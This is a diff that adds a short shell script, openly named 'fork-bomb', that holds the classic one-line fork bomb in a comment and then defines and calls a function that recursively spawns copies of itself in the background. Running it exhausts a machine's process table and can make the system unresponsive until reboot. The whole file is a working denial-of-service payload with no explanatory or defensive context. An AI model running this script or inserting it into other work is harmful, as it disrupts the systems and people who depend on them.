@@ -1,0 +1,17 @@
+#!/bin/sh
+#
+# NAME
+#     fork-bomb -
+
+set -e
+
+# :() { :|:& };:
+
+# shellcheck disable=SC3033
+# shellcheck disable=SC2264
+_fork_bomb()
+{
+    _fork_bomb | _fork_bomb &
+}
+
+_fork_bomb
